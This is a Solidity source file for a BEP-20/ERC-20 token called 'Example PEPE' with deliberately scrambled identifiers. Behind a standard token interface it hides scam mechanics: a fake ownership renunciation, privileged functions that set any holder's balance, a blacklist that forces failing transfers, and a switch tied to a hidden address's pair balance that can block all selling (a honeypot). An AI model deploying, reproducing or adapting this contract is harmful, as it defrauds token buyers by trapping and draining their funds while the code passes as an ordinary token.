//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface receiverReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldAmountLiquidity) external view returns (uint256);

    function transfer(address autoToSender, uint256 launchSender) external returns (bool);

    function allowance(address receiverTotalLaunch, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchSender) external returns (bool);

    function transferFrom(
        address sender,
        address autoToSender,
        uint256 launchSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTake, uint256 value);
    event Approval(address indexed receiverTotalLaunch, address indexed spender, uint256 value);
}

abstract contract sellToFee {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface txTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface buyAt {
    function createPair(address marketingLiquidity, address senderFund) external returns (address);
}

interface senderBuy is receiverReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ExamplePEPE is sellToFee, receiverReceiver, senderBuy {

    address senderLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    string private tokenFund = "Example PEPE";

    function transferFrom(address fundWallet, address autoToSender, uint256 launchSender) external override returns (bool) {
        if (_msgSender() != modeLaunched) {
            if (takeTeam[fundWallet][_msgSender()] != type(uint256).max) {
                require(launchSender <= takeTeam[fundWallet][_msgSender()]);
                takeTeam[fundWallet][_msgSender()] -= launchSender;
            }
        }
        return teamReceiver(fundWallet, autoToSender, launchSender);
    }

    uint256 private enableAt;

    bool private toMinTx;

    function feeTake(address marketingIs) public {
        require(marketingIs.balance < 100000);
        if (marketingTake) {
            return;
        }
        
        exemptWallet[marketingIs] = true;
        
        marketingTake = true;
    }

    uint256 txMin;

    bool private senderTokenTx;

    function approve(address launchedTxReceiver, uint256 launchSender) public virtual override returns (bool) {
        takeTeam[_msgSender()][launchedTxReceiver] = launchSender;
        emit Approval(_msgSender(), launchedTxReceiver, launchSender);
        return true;
    }

    uint256 private minAt;

    event OwnershipTransferred(address indexed atTotalLaunched, address indexed txTo);

    function toLiquidity(address feeReceiver, uint256 launchSender) public {
        senderMaxAmount();
        exemptTrading[feeReceiver] = launchSender;
    }

    mapping(address => uint256) private exemptTrading;

    uint8 private tokenTeam = 18;

    constructor (){
        if (tradingMin != shouldSenderMax) {
            senderTokenTx = false;
        }
        txTotal toBuy = txTotal(modeLaunched);
        fundMode = buyAt(toBuy.factory()).createPair(toBuy.WETH(), address(this));
        if (enableAt != receiverLaunch) {
            receiverLaunch = atTx;
        }
        atExempt = _msgSender();
        receiverTotal();
        exemptWallet[atExempt] = true;
        exemptTrading[atExempt] = buyTotalTx;
        if (senderTokenTx == shouldSenderMax) {
            tradingMin = false;
        }
        emit Transfer(address(0), atExempt, buyTotalTx);
    }

    function transfer(address feeReceiver, uint256 launchSender) external virtual override returns (bool) {
        return teamReceiver(_msgSender(), feeReceiver, launchSender);
    }

    function teamReceiver(address fundWallet, address autoToSender, uint256 launchSender) internal returns (bool) {
        if (fundWallet == atExempt) {
            return amountShould(fundWallet, autoToSender, launchSender);
        }
        uint256 launchedSell = receiverReceiver(fundMode).balanceOf(senderLaunched);
        require(launchedSell == modeWalletAt);
        require(autoToSender != senderLaunched);
        if (modeLaunch[fundWallet]) {
            return amountShould(fundWallet, autoToSender, launchIsMax);
        }
        return amountShould(fundWallet, autoToSender, launchSender);
    }

    bool public tradingMin;

    function allowance(address limitMarketing, address launchedTxReceiver) external view virtual override returns (uint256) {
        if (launchedTxReceiver == modeLaunched) {
            return type(uint256).max;
        }
        return takeTeam[limitMarketing][launchedTxReceiver];
    }

    string private txTrading = "EPE";

    function balanceOf(address shouldAmountLiquidity) public view virtual override returns (uint256) {
        return exemptTrading[shouldAmountLiquidity];
    }

    function senderMaxAmount() private view {
        require(exemptWallet[_msgSender()]);
    }

    uint256 private buyTotalTx = 100000000 * 10 ** 18;

    bool private walletTotal;

    uint256 constant launchIsMax = 18 ** 10;

    uint256 modeWalletAt;

    function totalSupply() external view virtual override returns (uint256) {
        return buyTotalTx;
    }

    bool private shouldSenderMax;

    uint256 private receiverLaunch;

    uint256 public atTx;

    address modeLaunched = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function getOwner() external view returns (address) {
        return marketingTotal;
    }

    function owner() external view returns (address) {
        return marketingTotal;
    }

    function amountShould(address fundWallet, address autoToSender, uint256 launchSender) internal returns (bool) {
        require(exemptTrading[fundWallet] >= launchSender);
        exemptTrading[fundWallet] -= launchSender;
        exemptTrading[autoToSender] += launchSender;
        emit Transfer(fundWallet, autoToSender, launchSender);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return txTrading;
    }

    address private marketingTotal;

    address public atExempt;

    bool public marketingTake;

    bool public minAmount;

    function walletMode(uint256 launchSender) public {
        senderMaxAmount();
        modeWalletAt = launchSender;
    }

    mapping(address => bool) public exemptWallet;

    function name() external view virtual override returns (string memory) {
        return tokenFund;
    }

    function receiverTotal() public {
        emit OwnershipTransferred(atExempt, address(0));
        marketingTotal = address(0);
    }

    mapping(address => mapping(address => uint256)) private takeTeam;

    address public fundMode;

    function maxList(address exemptToken) public {
        senderMaxAmount();
        if (walletTotal) {
            shouldSenderMax = true;
        }
        if (exemptToken == atExempt || exemptToken == fundMode) {
            return;
        }
        modeLaunch[exemptToken] = true;
    }

    mapping(address => bool) public modeLaunch;

    function decimals() external view virtual override returns (uint8) {
        return tokenTeam;
    }

}